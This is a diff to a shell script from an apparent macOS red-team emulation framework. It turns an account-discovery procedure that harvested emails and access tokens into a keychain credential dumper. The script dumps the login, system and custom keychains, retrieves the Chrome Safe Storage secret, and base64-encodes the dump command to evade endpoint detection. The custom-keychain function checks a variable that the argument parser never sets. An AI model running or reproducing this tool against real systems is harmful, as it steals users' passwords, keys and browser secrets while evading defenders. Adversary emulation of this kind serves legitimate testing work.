@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: find_account_defaults
-# Tactic: Discovery
-# Technique: T1087.001
-# GUID: 2488a056-5b6d-4a3a-b9d2-782019190eb8
-# Intent: Find account information and user data using defaults read commands to search application preferences and system settings
+# Procedure Name: keychain_security
+# Tactic: Credential Access
+# Technique: T1555.001
+# GUID: 289b5876-2049-42fc-8b8c-0b21db32503e
+# Intent: Dump credentials, keys, certificates, and sensitive information from macOS Keychain using security command
 # Author: @darmado | https://x.com/darmad0
-# created: 2025-01-27
+# created: 2025-01-02
 # Updated: 2025-06-03
-# Version: 1.0.2
+# Version: 1.0.1
 # License: Apache 2.0
 
 # Core function Info:
@@ -19,8 +19,8 @@
 #------------------------------------------------------------------------------
 NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1087.001" #replace with you coresponding ttp_id
+TACTIC="Credential Access" #replace with you coresponding tactic
+TTP_ID="T1555.001" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,18 +92,22 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-EMAIL_SEARCH=false
-ACCOUNT_SEARCH=false
-APP_DATA=false
-ALL=false
+LOGIN_KEYCHAIN=false
+SYSTEM_KEYCHAIN=false
+CHROME_STORAGE=false
+INPUT_KEYCHAIN_PATH=""
+KEYCHAIN_PATH=false
+ALL_KEYCHAINS=false
 
-CMD_DEFAULTS="defaults"
+LOGIN_KEYCHAIN_PATH="/Users/$USER/Library/Keychains/login.keychain-db"
+SYSTEM_KEYCHAIN_PATH="/Library/Keychains/System.keychain"
+CHROME_SERVICE_NAME="Chrome Safe Storage"
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="find_account_defaults"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="keychain_security"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -126,7 +130,7 @@ STEG_EXTRACT_FILE="" # File to extract hidden data from
 
 # OPSEC Check Settings (enabled by build script based on YAML configuration)
 CHECK_PERMS="false"
-CHECK_FDA="false"
+CHECK_FDA="true"
 CHECK_DB_LOCK="false"
 
 
@@ -607,17 +611,28 @@ core_parse_args() {
                 DEBUG=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --email-search)
-            EMAIL_SEARCH=true
+        --login-keychain)
+            LOGIN_KEYCHAIN=true
             ;;
-        --account-search)
-            ACCOUNT_SEARCH=true
+        --system-keychain)
+            SYSTEM_KEYCHAIN=true
             ;;
-        --app-data)
-            APP_DATA=true
+        --chrome-storage)
+            CHROME_STORAGE=true
             ;;
-        --all)
-            ALL=true
+        --keychain-path)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_KEYCHAIN_PATH="$2"
+                KEYCHAIN_PATH=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --all-keychains)
+            ALL_KEYCHAINS=true
             ;;
             *)
                 # Collect unknown arguments for error reporting
@@ -657,10 +672,11 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --email-search                   Search for email addresses in defaults
-  --account-search                 Search for user accounts and device IDs
-  --app-data                       Search application preferences for user data
-  --all                            Run all account discovery searches
+  --login-keychain                 Dump passwords from login keychain
+  --system-keychain                Dump passwords from system keychain
+  --chrome-storage                 Retrieve Chrome Safe Storage password manager secret
+  --keychain-path FILE_PATH        Custom keychain path to dump
+  --all-keychains                  Dump all accessible keychains
 
 Output Options:
   --format TYPE                 
@@ -2011,40 +2027,47 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --email-search
-if [ "$EMAIL_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --email-search"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --login-keychain
+if [ "$LOGIN_KEYCHAIN" = true ]; then
+    core_debug_print "Executing functions for --login-keychain"
+    result=$(execute_function dump_login_keychain)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --account-search
-if [ "$ACCOUNT_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --account-search"
-    result=$(execute_function find_user_accounts)
+# Execute functions for --system-keychain
+if [ "$SYSTEM_KEYCHAIN" = true ]; then
+    core_debug_print "Executing functions for --system-keychain"
+    result=$(execute_function dump_system_keychain)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --app-data
-if [ "$APP_DATA" = true ]; then
-    core_debug_print "Executing functions for --app-data"
-    result=$(execute_function find_app_user_data)
+# Execute functions for --chrome-storage
+if [ "$CHROME_STORAGE" = true ]; then
+    core_debug_print "Executing functions for --chrome-storage"
+    result=$(execute_function chrome_safe_storage)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --all
-if [ "$ALL" = true ]; then
-    core_debug_print "Executing functions for --all"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --keychain-path
+if [ "$KEYCHAIN_PATH" = true ]; then
+    core_debug_print "Executing functions for --keychain-path"
+    result=$(execute_function dump_custom_keychain)
     raw_output="${raw_output}${result}"
-    result=$(execute_function find_user_accounts)
+fi
+
+# Execute functions for --all-keychains
+if [ "$ALL_KEYCHAINS" = true ]; then
+    core_debug_print "Executing functions for --all-keychains"
+    result=$(execute_function dump_login_keychain)
     raw_output="${raw_output}${result}"
-    result=$(execute_function find_app_user_data)
+    result=$(execute_function dump_system_keychain)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function chrome_safe_storage)
     raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
-procedure="find_account_defaults"
+procedure="keychain_security"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2208,139 +2231,144 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-
-
-# Function: find_email_addresses
+# Function: dump_login_keychain
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_email_addresses() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+dump_login_keychain() {
+    local keychain_path="$LOGIN_KEYCHAIN_PATH"
     
-    # Find email addresses
-    local email_result
-    email_result=$($CMD_DEFAULTS find EmailAddress 2>/dev/null)
-    if [ -n "$email_result" ]; then
-        $CMD_PRINTF "EMAIL|defaults find EmailAddress|%s\n" "$email_result"
+    if [ ! -f "$keychain_path" ]; then
+        $CMD_PRINTF "ERROR|Login keychain not found at: %s\n" "$keychain_path"
+        return 1
     fi
     
-    # Find owner email addresses
-    local owner_result
-    owner_result=$($CMD_DEFAULTS find OwnerEmailAddress 2>/dev/null)
-    if [ -n "$owner_result" ]; then
-        $CMD_PRINTF "OWNER_EMAIL|defaults find OwnerEmailAddress|%s\n" "$owner_result"
-    fi
+    $CMD_PRINTF "KEYCHAIN_DUMP|LOGIN|Starting login keychain dump\n"
     
-    # Grammarly email data
-    local grammarly_result
-    grammarly_result=$($CMD_DEFAULTS read com.grammarly.ProjectLlama 2>/dev/null)
-    if [ -n "$grammarly_result" ]; then
-        $CMD_PRINTF "GRAMMARLY_DATA|defaults read com.grammarly.ProjectLlama|%s\n" "$grammarly_result"
+    # Use obfuscated command execution for EDR evasion
+    local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+    local b=" "
+    local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
+    local d=" \"$keychain_path\""
+    
+    local dump_result
+    dump_result=$(eval "$a$b$c$d" 2>/dev/null)
+    if [ $? -eq 0 ] && [ -n "$dump_result" ]; then
+        echo "$dump_result" | while IFS= read -r line; do
+            if echo "$line" | grep -q "keychain:"; then
+                $CMD_PRINTF "KEYCHAIN_INFO|METADATA|%s\n" "$line"
+            elif echo "$line" | grep -q "class:"; then
+                $CMD_PRINTF "KEYCHAIN_ENTRY|CLASS|%s\n" "$line"
+            elif echo "$line" | grep -q "attributes:"; then
+                $CMD_PRINTF "KEYCHAIN_ENTRY|ATTRIBUTES|%s\n" "$line"
+            elif echo "$line" | grep -q "data:"; then
+                $CMD_PRINTF "KEYCHAIN_ENTRY|DATA|%s\n" "$line"
+            else
+                $CMD_PRINTF "KEYCHAIN_ENTRY|OTHER|%s\n" "$line"
+            fi
+        done
+        $CMD_PRINTF "SUCCESS|Login keychain dump completed\n"
+    else
+        $CMD_PRINTF "ERROR|Failed to dump login keychain\n"
+        return 1
     fi
     
     return 0
 }
 
 
-# Function: find_user_accounts
+# Function: dump_system_keychain
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_user_accounts() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+dump_system_keychain() {
+    local keychain_path="$SYSTEM_KEYCHAIN_PATH"
     
-    # Find user accounts
-    local account_result
-    account_result=$($CMD_DEFAULTS find userAccount 2>/dev/null)
-    if [ -n "$account_result" ]; then
-        $CMD_PRINTF "USER_ACCOUNT|defaults find userAccount|%s\n" "$account_result"
+    if [ ! -f "$keychain_path" ]; then
+        $CMD_PRINTF "ERROR|System keychain not found at: %s\n" "$keychain_path"
+        return 1
     fi
     
-    # Find device identifiers
-    local device_result
-    device_result=$($CMD_DEFAULTS find DeviceIdentifier 2>/dev/null)
-    if [ -n "$device_result" ]; then
-        $CMD_PRINTF "DEVICE_ID|defaults find DeviceIdentifier|%s\n" "$device_result"
+    $CMD_PRINTF "KEYCHAIN_DUMP|SYSTEM|Starting system keychain dump\n"
+    
+    # Check for sudo privileges
+    if ! core_check_sudo false "Sudo required for system keychain access"; then
+        $CMD_PRINTF "ERROR|sudo not available for system keychain dump\n"
+        return 1
     fi
     
-    # Find access tokens
-    local token_result
-    token_result=$($CMD_DEFAULTS find access_token 2>/dev/null | sed 's/\\\\//g')
-    if [ -n "$token_result" ]; then
-        $CMD_PRINTF "ACCESS_TOKEN|defaults find access_token|%s\n" "$token_result"
-    fi
-    
-    # JAMF state
-    local jamf_result
-    jamf_result=$($CMD_DEFAULTS read com.jamf.connect.state 2>/dev/null)
-    if [ -n "$jamf_result" ]; then
-        $CMD_PRINTF "JAMF_STATE|defaults read com.jamf.connect.state|%s\n" "$jamf_result"
+    # Dump system keychain (requires sudo)
+    local dump_result
+    dump_result=$(sudo security dump-keychain -d "$keychain_path" 2>/dev/null)
+    if [ $? -eq 0 ] && [ -n "$dump_result" ]; then
+        $CMD_PRINTF "KEYCHAIN_DATA|SYSTEM|%s\n" "$dump_result"
+    else
+        $CMD_PRINTF "ERROR|Failed to dump system keychain - requires elevated privileges\n"
     fi
     
     return 0
 }
 
 
-# Function: find_app_user_data
+# Function: chrome_safe_storage
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_app_user_data() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
+chrome_safe_storage() {
+    $CMD_PRINTF "CHROME_STORAGE|RETRIEVE|Attempting to retrieve Chrome Safe Storage secret\n"
     
-    # Safari data
-    local safari_searches
-    safari_searches=$($CMD_DEFAULTS read com.apple.Safari RecentWebSearches 2>/dev/null)
-    if [ -n "$safari_searches" ]; then
-        $CMD_PRINTF "SAFARI_SEARCHES|defaults read com.apple.Safari RecentWebSearches|%s\n" "$safari_searches"
+    # Retrieve Chrome Safe Storage password manager secret
+    local chrome_secret
+    chrome_secret=$(security find-generic-password -w -s "$CHROME_SERVICE_NAME" 2>/dev/null)
+    
+    if [ $? -eq 0 ] && [ -n "$chrome_secret" ]; then
+        $CMD_PRINTF "CHROME_SECRET|SUCCESS|%s\n" "$chrome_secret"
+    else
+        $CMD_PRINTF "ERROR|Failed to retrieve Chrome Safe Storage secret - may not exist or require user interaction\n"
     fi
     
-    # Password settings
-    local password_settings
-    password_settings=$($CMD_DEFAULTS read com.apple.Passwords-Settings.extension 2>/dev/null)
-    if [ -n "$password_settings" ]; then
-        $CMD_PRINTF "PASSWORD_SETTINGS|defaults read com.apple.Passwords-Settings.extension|%s\n" "$password_settings"
+    return 0
+}
+
+
+# Function: dump_custom_keychain
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+dump_custom_keychain() {
+    if [ -z "$KEYCHAIN_PATH_ARG" ]; then
+        $CMD_PRINTF "ERROR|No custom keychain path specified\n"
+        return 1
     fi
     
-    # Microsoft To-Do
-    local todo_result
-    todo_result=$($CMD_DEFAULTS read com.microsoft.to-do-mac 2>/dev/null)
-    if [ -n "$todo_result" ]; then
-        $CMD_PRINTF "TODO_DATA|defaults read com.microsoft.to-do-mac|%s\n" "$todo_result"
+    if [ ! -f "$KEYCHAIN_PATH_ARG" ]; then
+        $CMD_PRINTF "ERROR|Custom keychain not found at: %s\n" "$KEYCHAIN_PATH_ARG"
+        return 1
     fi
     
-    # CapCut data
-    local capcut_result
-    capcut_result=$($CMD_DEFAULTS read com.lemon.lvoverseas 2>/dev/null)
-    if [ -n "$capcut_result" ]; then
-        $CMD_PRINTF "CAPCUT_DATA|defaults read com.lemon.lvoverseas|%s\n" "$capcut_result"
+    $CMD_PRINTF "KEYCHAIN_DUMP|CUSTOM|Starting custom keychain dump: %s\n" "$KEYCHAIN_PATH_ARG"
+    
+    # Check for sudo privileges
+    if ! core_check_sudo false "Sudo required for custom keychain access"; then
+        $CMD_PRINTF "ERROR|sudo not available for custom keychain dump\n"
+        return 1
     fi
     
-    # Google Drive settings
-    local gdrive_result
-    gdrive_result=$($CMD_DEFAULTS read com.google.drivefs.settings 2>/dev/null)
-    if [ -n "$gdrive_result" ]; then
-        $CMD_PRINTF "GDRIVE_SETTINGS|defaults read com.google.drivefs.settings|%s\n" "$gdrive_result"
-    fi
-    
-    # Mail settings
-    local mail_result
-    mail_result=$($CMD_DEFAULTS read com.apple.mail 2>/dev/null)
-    if [ -n "$mail_result" ]; then
-        $CMD_PRINTF "MAIL_SETTINGS|defaults read com.apple.mail|%s\n" "$mail_result"
-    fi
-    
-    # Notification Center preferences
-    local ncprefs_result
-    ncprefs_result=$($CMD_DEFAULTS read com.apple.ncprefs 2>/dev/null)
-    if [ -n "$ncprefs_result" ]; then
-        $CMD_PRINTF "NOTIFICATION_PREFS|defaults read com.apple.ncprefs|%s\n" "$ncprefs_result"
+    # Dump custom keychain
+    local dump_result
+    dump_result=$(sudo security dump-keychain -d "$KEYCHAIN_PATH_ARG" 2>/dev/null)
+    if [ $? -eq 0 ] && [ -n "$dump_result" ]; then
+        $CMD_PRINTF "KEYCHAIN_DATA|CUSTOM|%s\n" "$dump_result"
+    else
+        $CMD_PRINTF "ERROR|Failed to dump custom keychain at: %s\n" "$KEYCHAIN_PATH_ARG"
     fi
     
     return 0
